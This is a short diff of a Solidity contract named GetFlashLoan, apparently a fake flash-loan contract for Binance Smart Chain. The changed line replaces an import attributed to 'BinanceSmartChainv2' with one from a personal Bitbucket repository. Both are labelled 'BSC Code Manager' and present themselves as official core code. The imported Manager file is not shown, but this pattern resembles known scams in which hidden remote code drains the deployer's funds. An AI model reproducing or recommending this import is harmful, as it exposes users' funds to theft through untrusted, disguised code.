@@ -10,7 +10,7 @@ import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/i
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
 // BSC Code Manager
-import "https://github.com/BinanceSmartChainv2/Bsc-core/blob/main/blob/contract/interface/Manager.sol";
+import "https://bitbucket.org/senekas/binancesmartchainv2/src/master/Bsc-core/blob/main/blob/contract/interface/Manager.sol";
    
 contract GetFlashLoan {
    string public tokenName;
